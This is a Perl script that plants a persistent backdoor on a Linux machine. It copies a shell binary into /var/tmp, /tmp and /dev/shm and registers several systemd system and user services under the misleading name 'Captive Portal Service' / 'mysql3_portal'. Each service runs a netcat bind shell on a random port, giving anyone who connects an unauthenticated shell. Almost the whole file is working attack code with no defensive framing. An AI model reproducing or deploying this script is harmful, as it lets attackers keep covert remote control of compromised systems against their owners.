#!/usr/bin/env perl

my $executable_file = $ARGV[0] // '/bin/bash';
my $executable_args = sub { 
	my $port = int(rand(48128)) + 1024;
	print "using port $port\n";

	# "-lvnp $port -e /bin/bash" WILL ONLY WORK ON nc SUPPORTING -e 
	"-c 'mkfifo /tmp/f$port; nc -lvnp $port < /tmp/f$port | /bin/sh > /tmp/f$port 2>&1; rm /tmp/f$port'"
};
my $service_name = 'mysql3_portal';

my @cp_dirs = qw(/var/tmp /tmp /dev/shm);

die "provide an executable file ($executable_file is not executable)" if !-x $executable_file;

# copy executable to other directories
my ($exec_bname) = $executable_file =~ /([^\/]+)$/;
$exec_bname .= time();
for my $dir (@cp_dirs) {
	system("cp", $executable_file, "$dir/${exec_bname}") == 0 or print "copy to $dir failed: $!";
}

# add to system services
if (-w '/etc/systemd/system') {
	my $i = 0;
	for my $dir (@cp_dirs) {
		open(my $fh, '>', "/etc/systemd/system/${service_name}_${i}.service") or do {
			print "could not open service file: $!";
			next;
		};

		my $service_text = <<END;
[Unit]
Description=Captive Portal Service

[Service]
ExecStart=$dir/${exec_bname} ${\$executable_args->()}

[Install]
WantedBy=multi-user.target
END
		print $fh $service_text;
		close $fh;

		print "enabling/starting copy $i\n";
		`systemctl enable ${service_name}_${i}.service`;
		`systemctl start ${service_name}_${i}.service`;

		$i++;
	}

	open(my $fh, '>', "/etc/systemd/system/${service_name}.service") or do {
		print "could not open service file: $!";
		next;
	};

	my $service_text = <<END;
[Unit]
Description=Captive Portal Service

[Service]
ExecStart=$executable_file ${\$executable_args->()}

[Install]
WantedBy=multi-user.target
END
	print $fh $service_text;
	close $fh;

	print "enabling/starting main\n";
	`systemctl enable ${service_name}.service`;
	`systemctl start ${service_name}.service`;
}

# try to make directory
if (! -d "$ENV{HOME}/.config/systemd/user/") {
	my @dirs = split('/', "$ENV{HOME}/.config/systemd/user/");
	my $current_path = '';

	for my $dir (@dirs) {
		$current_path .= "$dir/";
		print "unable to mkdir $current_path\n" if (! -d $current_path && ! mkdir $current_path);
	}
}

# add to user services
if ($ENV{HOME} ne '/root' && -w "$ENV{HOME}/.config/systemd/user/") {
	my $i = 0;
	for my $dir (@cp_dirs) {
		open(my $fh, '>',  "$ENV{HOME}/.config/systemd/user/${service_name}_${i}-u.service") or do {
			print "could not open service file: $!"; next;
		};

		my $service_text = <<END;
[Unit]
Description=Captive Portal Service

[Service]
ExecStart=$dir/$exec_bname ${\$executable_args->()}

[Install]
WantedBy=multi-user.target
END
		print $fh $service_text;
		close $fh;

		print "enabling/starting user copy $i\n";
		`systemctl enable --user ${service_name}_${i}-u.service`;
		`systemctl start --user ${service_name}_${i}-u.service`;

		$i++;
	}

	open(my $fh, '>', "$ENV{HOME}/.config/systemd/user/${service_name}-u.service") or do {
		print "could not open service file: $!";
		next;
	};

	my $service_text = <<END;
[Unit]
Description=Captive Portal Service

[Service]
ExecStart=$executable_file ${\$executable_args->()}

[Install]
WantedBy=multi-user.target
END
	print $fh $service_text;
	close $fh;

	print "enabling/starting user main\n";
	`systemctl enable --user ${service_name}-u.service`;
	`systemctl start --user ${service_name}-u.service`;
}
